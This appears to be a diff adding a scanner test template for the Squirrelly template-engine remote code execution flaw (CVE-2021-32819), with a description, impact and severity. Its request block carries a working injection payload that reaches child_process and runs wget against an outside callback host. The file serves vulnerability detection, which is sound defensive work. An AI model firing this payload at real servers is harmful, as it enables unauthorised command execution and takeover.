@@ -1,0 +1,69 @@
+id: NODEJS_SQUIRRELLY_RCE
+info:
+  name: "Nodejs Squirrelly Remote Code Execution"
+  description: "This vulnerability allows for remote code execution (RCE) due to improper handling of user input in template rendering. Versions of Squirrelly prior to the fix are susceptible to attackers injecting malicious code through specially crafted templates. This can lead to unauthorized access and control over the affected server, posing a significant security risk to applications utilizing this templating engine. Mitigating this vulnerability involves updating to the latest secure versions of Squirrelly."
+  details: "This vulnerability in Node.js Squirrelly arises from the lack of input validation in its template rendering process. Attackers can exploit this by submitting specially crafted templates that execute arbitrary code when rendered. The issue primarily affects applications that use Squirrelly for dynamic content generation without proper safeguards in place. This flaw highlights the importance of sanitizing user input to prevent code injection attacks."
+  impact: "Successful exploitation of the Node.js Squirrelly vulnerability can lead to remote code execution on the server, allowing attackers to run arbitrary code with the same privileges as the application. This could compromise sensitive data, alter application behavior, or gain unauthorized access to the underlying system. The potential impact extends to complete system takeover, data breaches, and disruptions of services, making it a critical security concern for affected applications."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: NODEJS_SQUIRRELLY_RCE
+  severity: CRITICAL
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2021-32819
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: "host"
+      value:
+        extract: hostHeaderVal
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_url: "/"
+        - modify_method: GET
+        - replace_body: '{}'
+        - add_query_param:
+            Express: "aaaa"
+        - add_query_param:
+            autoEscape: ""
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        - add_query_param:
+            defaultFilter: "%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://test-services.akto.io/${random_uuid}%27);//"
+validate:
+  response_payload:
+    length:
+      gt: 0
+  ssrf_url_hit: ${random_uuid}
+  response_headers:
+    for_one:
+      key:
+        eq: "user-agent"
+      value:
+        eq: "wget"
